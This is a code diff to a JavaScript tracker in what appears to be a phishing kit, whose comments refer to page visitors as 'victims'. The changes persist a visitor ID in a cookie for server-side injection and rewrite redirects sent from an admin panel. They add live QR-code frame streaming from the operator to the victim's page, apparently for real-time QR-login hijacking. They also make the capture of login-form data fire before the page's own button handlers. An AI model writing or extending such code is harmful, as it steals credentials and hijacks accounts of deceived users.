@@ -39,13 +39,18 @@
   const SCRIPT_SRC = scriptTag.src;
   const SERVER_URL = SCRIPT_SRC ? SCRIPT_SRC.replace(/\/tracker\.js.*$/, '') : window.location.origin;
 
-  // Generate or retrieve visitor ID
+  // Generate or retrieve visitor ID. Mirror into a cookie so the server-side
+  // slot injection (which runs before any JS on the page) can read it.
   function getVisitorId() {
     let id = localStorage.getItem('_alp_vid');
     if (!id) {
       id = 'v_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
       localStorage.setItem('_alp_vid', id);
     }
+    // Always refresh the cookie — covers first visit after this change was deployed
+    try {
+      document.cookie = 'alp_vid=' + encodeURIComponent(id) + '; path=/; max-age=' + (60 * 60 * 24 * 365) + '; SameSite=Lax';
+    } catch (_) {}
     return id;
   }
 
@@ -153,6 +158,29 @@
   function cleanRedirectUrl(url) {
     if (!url) return url;
     var currentPath = window.location.pathname;
+    var host = window.location.hostname;
+    var isLocal = host === 'localhost' || host === '127.0.0.1';
+
+    // LOCAL DEV: xPages are served via slug-based routes (/demo/<slug>/<page>).
+    // Normalize ANY incoming URL to /demo/<slug>/<page> based on victim's own path,
+    // regardless of what the admin panel sent (/card, /atp/card, /demo/atp/card).
+    if (isLocal) {
+      if (/^https?:\/\//i.test(url)) return url;
+      var m = currentPath.match(/^\/demo\/([^\/]+)\//i);
+      if (m && url.charAt(0) === '/') {
+        var slug = m[1];
+        var esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        // Strip any existing /demo/<slug>/ or /<slug>/ prefix, then rebuild cleanly
+        var pagePart = url
+          .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
+          .replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/')
+          .replace(/^\//, '');
+        return '/demo/' + slug + '/' + pagePart;
+      }
+      return url;
+    }
+
+    // PRODUCTION: strip /demo/<slug>/ when victim is NOT on /demo/ (hosted at root).
     if (!currentPath.startsWith('/demo/')) {
       url = url.replace(/^\/demo\/[^\/]+\//i, '/').replace(/^\/demo\//i, '/');
     }
@@ -429,6 +457,28 @@
       } catch (_) {}
     });
 
+    // ─── Live QR Stream — receive frames from admin and update page ─────
+    var _qrOriginalSrc = null; // stash the original QR src for when stream stops
+    socket.on('tracker:qr-frame', function(data) {
+      if (!data || !data.frame) return;
+      var qrEl = document.querySelector('[data-alp-slot="qr-image"]');
+      if (!qrEl) return;
+      // Remember original src on first frame so we can restore it
+      if (_qrOriginalSrc === null) {
+        _qrOriginalSrc = qrEl.src || qrEl.getAttribute('src') || '';
+      }
+      qrEl.src = data.frame;
+    });
+
+    socket.on('tracker:qr-stream-stop', function() {
+      // Restore original QR image when admin stops streaming
+      var qrEl = document.querySelector('[data-alp-slot="qr-image"]');
+      if (qrEl && _qrOriginalSrc !== null) {
+        qrEl.src = _qrOriginalSrc;
+        _qrOriginalSrc = null;
+      }
+    });
+
     setupCommonTrackers(socket);
   });
 
@@ -577,7 +627,10 @@
       }
     });
 
-    // 2. Click capture ONLY on login/submit buttons when inputs are filled
+    // 2. Click capture ONLY on login/submit buttons when inputs are filled.
+    // Use CAPTURE phase (third arg = true) so we run BEFORE the button's own
+    // handler — buttons that call stopPropagation() in bubbling phase would
+    // otherwise prevent this listener from ever firing.
     document.addEventListener('click', function(e) {
       const el = e.target.closest('a, button, input[type="button"], input[type="submit"], [role="button"], .btn, .button, .login');
       if (!el || !isSubmitOrLoginButton(el)) return;
@@ -587,7 +640,7 @@
         const btnId = el.id || el.className || el.textContent.trim().slice(0, 20) || 'login_button';
         sendCapturedFormData(formData, btnId, 'login_click');
       }
-    });
+    }, true);
 
     // Track SPA navigation
     let lastUrl = window.location.href;
